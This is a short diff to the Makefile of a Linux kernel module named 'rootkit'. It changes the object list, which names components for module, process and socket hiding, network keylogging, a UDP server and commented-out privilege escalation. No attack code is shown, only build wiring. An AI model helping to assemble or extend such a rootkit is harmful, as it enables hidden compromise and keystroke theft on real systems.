@@ -28,7 +28,7 @@ KDIR = /lib/modules/$(shell uname -r)/build
 TARGET = rootkit
 
 obj-m += $(TARGET).o
-rootkit-objs := module_masking.o network_keylogging.o process_masking.o socket_masking.o covert_channel.o jsmn.o core.o
+rootkit-objs := module_masking.o network_keylogging.o process_masking.o socket_masking.o conf_manager.o jsmn.o udp_server.o core.o
 ccflags-y = -Wno-unused-function
 #file_masking.o priviledge_escalating.o
 
